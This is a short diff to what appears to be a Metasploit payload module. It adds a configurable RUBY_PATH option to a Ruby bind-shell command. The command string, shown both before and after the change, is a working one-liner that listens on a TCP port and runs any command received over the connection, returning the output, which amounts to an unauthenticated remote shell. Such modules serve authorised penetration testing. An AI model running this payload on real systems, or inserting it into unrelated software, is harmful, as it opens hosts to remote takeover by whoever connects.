@@ -25,6 +25,9 @@ module MetasploitModule
       'RequiredCmd' => 'ruby',
       'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
     ))
+    register_options([
+      OptString.new('RUBY_PATH', [true ,'The path to Ruby interpreter', 'ruby'])
+    ])
   end
 
   def generate
@@ -32,6 +35,6 @@ module MetasploitModule
   end
 
   def command_string
-    "ruby -rsocket -e \"s=TCPServer.new(\\\"#{datastore['LPORT']}\\\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end;end\""
+    "#{datastore['RUBY_PATH']} -rsocket -e \"s=TCPServer.new(\\\"#{datastore['LPORT']}\\\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end;end\""
   end
 end
